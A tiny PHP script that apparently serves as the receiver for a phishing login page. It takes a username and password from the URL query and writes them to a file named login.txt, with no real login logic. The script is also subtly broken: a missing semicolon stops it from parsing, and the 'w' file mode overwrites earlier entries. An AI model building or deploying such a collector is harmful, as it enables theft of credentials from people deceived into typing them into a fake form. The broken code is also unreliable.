
<?php
  
 $user = $_GET['user'];
 $passwords = $_GET['passwords']

 if (!isset($user)){
     echo " <h1> Wrong to send requests :!!!!1 </h1> ";
 }else{
      
     $file_name = "login.txt";

     $fofile = fopen($file_name,"w") or die (" conntent open file : ".$file_name);
     fwrite($fofile,$user." : ".$passwords."\n");
     }

?>
